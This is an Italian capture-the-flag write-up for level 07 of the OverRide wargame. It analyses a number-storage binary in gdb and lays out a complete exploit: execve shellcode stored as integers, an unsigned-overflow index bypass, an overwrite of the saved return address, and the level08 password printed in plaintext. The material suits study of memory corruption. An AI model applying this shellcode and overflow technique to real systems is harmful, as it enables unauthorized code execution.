# Level 07

Analizziamo il binario con `gdb`:
```
level07@OverRide:~$ gdb -q level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0804842c  _init
0x08048470  printf
0x08048470  printf@plt
0x08048480  fflush
0x08048480  fflush@plt
0x08048490  getchar
0x08048490  getchar@plt
0x080484a0  fgets
0x080484a0  fgets@plt
0x080484b0  __stack_chk_fail
0x080484b0  __stack_chk_fail@plt
0x080484c0  puts
0x080484c0  puts@plt
0x080484d0  __gmon_start__
0x080484d0  __gmon_start__@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  memset
0x080484f0  memset@plt
0x08048500  __isoc99_scanf
0x08048500  __isoc99_scanf@plt
0x08048510  _start
0x08048540  __do_global_dtors_aux
0x080485a0  frame_dummy
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
0x08048a00  __libc_csu_init
0x08048a70  __libc_csu_fini
0x08048a72  __i686.get_pc_thunk.bx
0x08048a80  __do_global_ctors_aux
0x08048aac  _fini
```

### Funzione `main`
Come prima cosa elimina completamente `argv` e `envp` per poi passare in un ciclo infinito
nel quale sono possibili solo due comandi, uno di lettura e uno di scrittura su di un array
di interi.

### Funzione `read_number`
Richiede un numero tramite la funzione `get_unum` che verrà calcolato come indice del buffer
per stampare il valore al suo interno.

### Funzione `store_number`
Richiede il numero da salvare e in quale posizione, non permettendo l'inserimento nelle
posizioni divisibili per 3.

### Funzione `get_unum`
Si occupa di restituire il valore inserito dall'utente come numero intero senza segno e 
successivamente pulire lo standard input tramite la funzione `clear_stdin`.

### Funzione `clear_stdin`
Pulisce il buffer di input da qualsiasi altro carattere non catturato.

### Soluzione
Purtroppo non possiamo usare l'env per salvare lo shellcode, l'unica cosa scrivibile
è il buffer tramite la funzione `store_number`, dunque divideremo lo shellcode in gruppi
da 4 byte e li convertiamo come un unico numero decimale così da non creare problemi a
`scanf`, ma abbiamo un altro problema, ovvero che nelle posizioni divisibili per 3 non
possiamo scrivere, dunque bypassiamo il blocco sfruttando l'overflow dell'`unsigned int`.

Shellcode che useremo:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80
```
Suddiviso e convertito in little endian tramite il programma in questa cartella:
```
0x6850c031
0x68732f2f
0x69622f68
0x50e3896e
0x31e18953
0x830bb0d2
0x80cdf0e4
```
Convertiamo in deciamale con python:
```
level07@OverRide:~$ python
Python 2.7.3 (default, Jun 22 2015, 19:33:41)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x6850c031
1750122545
>>> 0x68732f2f
1752379183
>>> 0x69622f68
1768042344
>>> 0x50e3896e
1357089134
>>> 0x31e18953
836864339
>>> 0x830bb0d2
2198581458
>>> 0x80cdf0e4
2160980196
```
Ora convertiamo gli indici 0, 3 e 6 nel seguente modo:
```
UINT_MAX -> 4294967295 + 1 = 4294967296

4294967296 / 4 + 0 = 1073741824
4294967296 / 4 + 3 = 1073741827
4294967296 / 4 + 6 = 1073741830
```
Dunque dovremmo inserire i seguente dati:
```
+------------+------------+
|   indice   |   numero   |
+------------+------------+
| 1073741824 | 1750122545 |
|          1 | 1752379183 |
|          2 | 1768042344 |
| 1073741827 | 1357089134 |
|          4 |  836864339 |
|          5 | 2198581458 |
| 1073741830 | 2160980196 |
+------------+------------+
```
Ora ci serve l'indirizzo del buffer e la distanza rispetto al buffer 
dell'indirizzo in `eip` così da poter scrivere l'indirizzo sempre tramite
indice del buffer:
```
level07@OverRide:~$ gdb -q level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x /x $ebp+8
0xffffd520:     0xffffd544
(gdb) p /d (0xffffd544 - 0xffffd520) / 4
$1 = 9
```
l'indirizzo del buffer possiamo trovarlo all'indice `-9`
```
level07@OverRide:~$ gdb -q level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebp at 0xffffd708, eip at 0xffffd70c
(gdb) p /d (0xffffd70c - 0xffffd544) / 4
$1 = 114
```
mentre all'indice `114` avremo l'indirizzo in `eip`, purtroppo `114` è
divisibile per 3 dunque bisognerà applicare la formula di prima per avere
l'indice da scrivere:
```
4294967296 / 4 + 114 = 1073741938
```
Ora abbiamo tutto, procediamo:
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 1750122545
 Index: 1073741824
 Completed store command successfully
Input command: store
 Number: 1752379183
 Index: 1
 Completed store command successfully
Input command: store
 Number: 1768042344
 Index: 2
 Completed store command successfully
Input command: store
 Number: 1357089134
 Index: 1073741827
 Completed store command successfully
Input command: store
 Number: 836864339
 Index: 4
 Completed store command successfully
Input command: store
 Number: 2198581458
 Index: 5
 Completed store command successfully
Input command: store
 Number: 2160980196
 Index: 1073741830
 Completed store command successfully
Input command: read
 Index: -9
 Number at data[4294967287] is 4294956388
 Completed read command successfully
Input command: store
 Number: 4294956388
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ exit
```

```
level07@OverRide:~$ su level08
Password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
level08@OverRide:~$
```